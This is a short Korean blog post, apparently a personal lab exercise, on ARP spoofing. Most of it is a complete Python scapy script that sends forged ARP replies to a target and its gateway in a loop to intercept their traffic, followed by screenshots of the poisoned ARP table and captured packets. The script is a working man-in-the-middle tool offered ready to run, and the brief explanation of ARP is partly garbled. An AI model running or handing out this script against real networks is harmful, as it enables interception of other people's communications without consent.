---
layout: post
title: "Arp Spoof 실습"
date: 2020-05-04
excerpt: "Arp Spoof"
tags: [Arp,Network, hacking]
comments: true
---

## Arp Spoofing

컴퓨터의 Mac주소를 IP주소로 변경해주기 위해 라우터내에는 Arp Table이 존재한다.
그 Arp Table에 접근하여 피해자의 Mac주소를 공격자의 Mac주소로 변경하여
피해자에게 전송되는 패킷을 갈취하는 행위이다.

공격자의 ip는 192.168.0.101
피해자의 ip는 192.168.0.1


{% highlight python %}
{
    import scapy.all as scapy
import argparse
import sys
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target",help="Specify target ip")
    parser.add_argument("-g","--gatway",dest="gateway",help="Specify spoof ip")
    return parser.parse_args()

def restore(destination_ip, source_ip):
    destination_mac = get_Mac(destination_ip)
    source_mac = get_Mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def get_Mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet=broadcast_packet/arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_Mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)

arguments = get_arguments()
sent_packets = 0
try:
    while True:
        spoof(arguments.target, arguments.gateway)
        spoof(arguments.gateway, arguments.target)
        sent_packets +=2
        print("\r[+] Sent packets:"+str(sent_packets)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Ctrl+C detected...Restoring ARP Tables Please Wait!")
    restore(arguments.target, arguments.gateway)
    restore(arguments.gateway, arguments.target)
}
{% endhighlight %}
 

{% capture images %}
https://user-images.githubusercontent.com/49140815/140677578-3719cbc3-8a03-4254-bd73-84dfc194f43d.JPG
https://user-images.githubusercontent.com/49140815/140677612-24f9ff11-07b6-4f56-add3-55933c1b2e23.JPG
{% endcapture %}
{% include gallery images=images caption="공격이전 이후 Arp Table" cols=2 %}

{% capture images %}
https://user-images.githubusercontent.com/49140815/140677686-8eef551b-9387-44f0-a358-77f9cb39aae7.JPG
{% endcapture %}
{% include gallery images=images caption="공격자의 패킷확인" cols=1 %}

공격자의 화면에서 전송되는 패킷을 확인 할수있다